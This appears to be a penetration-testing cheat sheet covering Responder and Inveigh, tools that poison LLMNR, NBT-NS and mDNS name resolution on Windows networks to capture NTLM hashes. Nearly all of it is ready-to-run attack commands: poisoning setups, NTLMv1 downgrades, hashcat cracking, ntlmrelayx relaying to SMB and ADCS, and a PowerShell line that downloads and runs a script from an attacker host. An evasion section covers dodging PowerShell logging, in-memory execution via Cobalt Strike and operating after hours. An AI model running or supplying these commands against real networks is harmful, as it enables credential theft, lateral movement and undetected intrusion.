# <span style="color:rgb(255, 192, 0)">Responder & Inveigh - Complete Command Reference</span>

Both tools perform LLMNR, NBT-NS, and mDNS poisoning to capture NTLM hashes. Responder is Python-based (Linux), Inveigh is PowerShell/C#-based (Windows).

---

## <span style="color:rgb(255, 0, 0)">Responder</span>

### Overview

Responder by @lgandx poisons LLMNR, NBT-NS, and mDNS queries on the local network. When a victim performs a name resolution failure, Responder responds claiming to be the target, capturing the victim's NTLMv1/v2 hash.

**Installation:**
```bash
git clone https://github.com/lgandx/Responder.git
cd Responder
# No dependencies needed beyond base Python3
sudo python3 Responder.py -I eth0
```

### Basic Usage

```bash
# Start responder on interface
sudo python3 Responder.py -I eth0

# Specify IP (multihomed)
sudo python3 Responder.py -I eth0 -i 192.168.1.100

# Specific IP for responses
sudo python3 Responder.py -I eth0 --ip 192.168.1.100

# Analyze mode (don't poison, just listen)
sudo python3 Responder.py -I eth0 -A

# Quiet mode (no output)
sudo python3 Responder.py -I eth0 -q
```

### Protocol Control

```bash
# Disable specific servers (default: all enabled)
sudo python3 Responder.py -I eth0 --wredir off

# Disable SMB to avoid issues
sudo python3 Responder.py -I eth0 --SMB off

# Disable HTTP
sudo python3 Responder.py -I eth0 --HTTP off

# Enable only specific protocols
sudo python3 Responder.py -I eth0 --LLMNR on --NBTNS on --MDNS off --DHCP off

# Disable LLMNR
sudo python3 Responder.py -I eth0 --LLMNR off

# Disable NBT-NS
sudo python3 Responder.py -I eth0 --NBTNS off

# Disable mDNS (Bonjour)
sudo python3 Responder.py -I eth0 --MDNS off

# Disable DHCP
sudo python3 Responder.py -I eth0 --DHCP off

# Disable WPAD
sudo python3 Responder.py -I eth0 --WPAD off
```

### Advanced Options

```bash
# WPAD support
sudo python3 Responder.py -I eth0 -w

# WPAD with basic auth (less suspicious)
sudo python3 Responder.py -I eth0 -w -r

# Fingerprint only
sudo python3 Responder.py -I eth0 -f

# Force NTLMv1 downgrade (NTLMv1 captures easier to crack)
sudo python3 Responder.py -I eth0 --force-auth

# NTLMv1 only
sudo python3 Responder.py -I eth0 --NTLMv1

# Disable HTTP server for SMB-only
sudo python3 Responder.py -I eth0 --SMB on --HTTP off --HTTPS off

# Custom challenge
sudo python3 Responder.py -I eth0 -c 1122334455667788

# Bind to specific port
sudo python3 Responder.py -I eth0 --smb-port 4445

# Log directory
sudo python3 Responder.py -I eth0 -l /tmp/logs

# Verbose
sudo python3 Responder.py -I eth0 -v

# Turn off packet logging
sudo python3 Responder.py -I eth0 -L off

# Disable answers to specific protocols
sudo python3 Responder.py -I eth0 -D wpad
```

### Responder.conf Configuration

Edit `Responder.conf` for persistent settings:

```ini
[Responder Core]
; Default SQL = Off
SQL = Off
SMB = On
HTTP = On
HTTPS = On
LDAP = On
LDAPS = On
DNS = On
DHCP = On
WPAD = On
RDP = On
FTP = On
IMAP = On
POP3 = On
SMTP = On
MSSQL = On

[Fingerprint]
Fingerprint = Off

[HTTP Server]
; Start HTTP server
HTTPS = On
; Basic auth instead of NTLM
Basic = Off
; JS download
JSFile = Off
```

### Captured Hashes

Hashes are stored in `logs/` directory in format:
```
logs/HTTP-NTLMv2-<IP>.txt
logs/SMB-NTLMv2-<IP>.txt
logs/LLMNR-<IP>.txt
logs/Responder-Session.log
```

### Cracking Captured Hashes

```bash
# NTLMv2 hashcat mode 5600
hashcat -m 5600 captured_hashes.txt wordlist.txt

# NTLMv1 hashcat mode 5500
hashcat -m 5500 captured_hashes.txt wordlist.txt

# John
john --format=netntlmv2 captured_hashes.txt --wordlist=wordlist.txt
```

### Responder + NTLM Relay Workflow

```bash
# Terminal 1: Start Responder with SMB off (relay will handle SMB)
sudo python3 Responder.py -I eth0 --SMB off

# Terminal 2: Start ntlmrelayx.py pointing to target
python3 ntlmrelayx.py -t smb://target_IP -smb2support

# Or relay to ADCS
python3 ntlmrelayx.py -t http://CA/certsrv/certfnsh.asp -adcs -smb2support
```

### Multi-relay (Responder + MultiRelay)

```bash
# MultiRelay.py (in Responder tools/)
python3 tools/MultiRelay.py -t target_IP -u Administrator
```

---

## <span style="color:rgb(0, 176, 240)">Inveigh (PowerShell)</span>

### Overview

Inveigh by @Kevin-Robertson/Tylous is the Windows equivalent of Responder. It performs LLMNR/NBT-NS/mDNS/DHCPv6 spoofing and captures NTLM challenges. The C# version (InveighZero) is more stable and OPSEC-safe.

### Inveigh (PowerShell)

```powershell
# Load
iex (New-Object Net.WebClient).DownloadString('http://attacker/Inveigh.ps1')

# Start all listeners
Invoke-Inveigh -ConsoleOutput Y -LogOutput Y -FileOutput Y

# Start with specific protocols
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS Y -DHCPv6 N -HTTP Y -HTTPS Y

# Disable SMB
Invoke-Inveigh -SMB N

# Start in background (runspace)
Invoke-Inveigh -ConsoleOutput Y -RunSpace

# Only LLMNR and NBNS (no other protocols)
Invoke-Inveigh -LLMNR Y -NBNS Y -mDNS N -HTTP N -HTTPS N -SMB N -DHCPv6 N

# WPAD capture
Invoke-Inveigh -WPAD Y

# HTTPS capture
Invoke-Inveigh -HTTPS Y

# Challenge configuration
Invoke-Inveigh -Challenge 1122334455667788

# Only capture NTLMv2
Invoke-Inveigh -NTLMv2 Y -NTLMv1 N

# Machine accounts only (capture computer hashes)
Invoke-Inveigh -MachineAccounts Y

# Output to console only
Invoke-Inveigh -ConsoleOutput Y -LogOutput N -FileOutput N

# Custom HTTP response
Invoke-Inveigh -HTTPResponse "<html><body>404</body></html>"

# Disable Inspect (reduce stdout)
Invoke-Inveigh -ConsoleStatus Y -Inspector N
```

### Inveigh Commands (during runtime)

```powershell
# Get status
Get-InveighStatus

# List captured credentials
Get-Inveigh -ConsoleOutput Y

# Stop Inveigh
Stop-Inveigh

# Clear captured data
Clear-Inveigh

# Get specific unique credentials
Get-Inveigh -Unique Y

# Export captured data
Get-Inveigh -ConsoleOutput Y | Export-CliXML inveigh.xml
```

### InveighZero (C#)

InveighZero is the .NET/C# version with improved OPSEC, performance, and stability.

```powershell
# Binary execution
InveighZero.exe

# With arguments
InveighZero.exe -LLMNR Y -NBNS Y -mDNS N -HTTP Y -Console Y

# Full options
InveighZero.exe -LLMNR Y -NBNS Y -mDNS Y -DHCPv6 Y -HTTP Y -HTTPS Y \
  -SMB Y -Console Y -File Y -Log Y -WPAD Y -MachineAccounts Y \
  -Challenge 1122334455667788 -NTLMv2Only N -NTLMv1Only N

# Stealth mode (no HTTP/HTTPS)
InveighZero.exe -LLMNR Y -NBNS Y -Console Y

# Maximum capture
InveighZero.exe -All Y -Console Y -File Y -Log Y

# No output (silent)
InveighZero.exe -All Y -Console N -File Y -Log Y
```

### Inveigh Parameters

| Parameter | Values | Description |
|-----------|--------|-------------|
| `-All` | Y/N | Enable all poisoning |
| `-LLMNR` | Y/N | LLMNR poisoning |
| `-NBNS` | Y/N | NBT-NS poisoning |
| `-mDNS` | Y/N | mDNS poisoning |
| `-DHCPv6` | Y/N | DHCPv6 poisoning |
| `-HTTP` | Y/N | HTTP server |
| `-HTTPS` | Y/N | HTTPS server |
| `-SMB` | Y/N | SMB server |
| `-WPAD` | Y/N | WPAD server |
| `-Console` | Y/N | Console output |
| `-File` | Y/N | File output |
| `-Log` | Y/N | Log output |
| `-MachineAccounts` | Y/N | Capture machine hashes |
| `-NTLMv1Only` | Y/N | Force NTLMv1 |
| `-NTLMv2Only` | Y/N | Force NTLMv2 |
| `-Challenge` | HEX | Custom NTLM challenge |

---

## <span style="color:rgb(146, 208, 80)">Tools Comparison: Responder vs Inveigh</span>

| Feature | Responder | Inveigh (PS) | InveighZero |
|---------|-----------|--------------|-------------|
| Platform | Linux | Windows | Windows |
| Language | Python | PowerShell | C# |
| LLMNR | Yes | Yes | Yes |
| NBT-NS | Yes | Yes | Yes |
| mDNS | Yes | Yes | Yes |
| DHCPv6 | Basic | Yes | Yes |
| HTTP/HTTPS | Yes | Yes | Yes |
| SMB | Yes | Yes | Yes |
| LDAP | Yes | No | No |
| WPAD | Yes | Yes | Yes |
| FTP/IMAP/POP3 | Yes | No | No |
| MSSQL | Yes | No | No |
| NTLMv1 downgrade | Yes | Manual | Yes |
| RunSpace | N/A | Yes | N/A |
| OPSEC | Good | Medium | Good |
| Performance | High | Low-Medium | High |
| Stealth | Adjustable | Adjustable | Adjustable |
| Multi-relay | tools/ | No | No |

---

## <span style="color:rgb(255, 0, 0)">OPSEC & Detection Considerations</span>

```yaml
Detection (Responder):
  - Responder logs all incoming NBNS/LLMNR/mDNS queries
  - Security teams monitor for upstream NBNS responses (multiple responses)
  - Event ID 4697 (service install) if running as service
  - Network monitoring for rogue WPAD servers
  - LLMNR/NBNS query spikes may trigger alerts
  
Detection (Inveigh):
  - PowerShell script block logging (AMSI) for Inveigh.ps1
  - Event ID 4104 (ScriptBlock logging) captures Inveigh commands
  - Use InveighZero instead to avoid PowerShell logging
  - OPSEC: Run in separate process via Cobalt Strike's execute-assembly
  
Evasion:
  - Use Responder with limited protocols to reduce noise
  - Don't use WPAD in modern environments (highly monitored)
  - Use --SMB off when relaying (prevent local capture conflicts)
  - Run on non-standard hours (lunch, after hours)
  - Use InveighZero from execute-assembly (memory only)
```

---

## <span style="color:rgb(0, 176, 240)">Common Workflows</span>

### Standard Capture + Crack

```bash
# Responder
sudo python3 Responder.py -I eth0 -w -r -f

# Wait for hashes, then crack
hashcat -m 5600 Responder/logs/SMB-NTLMv2-*.txt wordlist.txt
```

### Responder + Relay Chain

```bash
# Terminal 1: Responder (SMB off to avoid self-capture)
sudo python3 Responder.py -I eth0 -SMB off

# Terminal 2: ntlmrelayx to target
ntlmrelayx.py -t smb://192.168.1.100 -smb2support -i
```

### Inveigh from C2

```powershell
# Via execute-assembly
execute-assembly /path/InveighZero.exe -LLMNR Y -NBNS Y -Console Y -File Y

# Get results
get-output
```
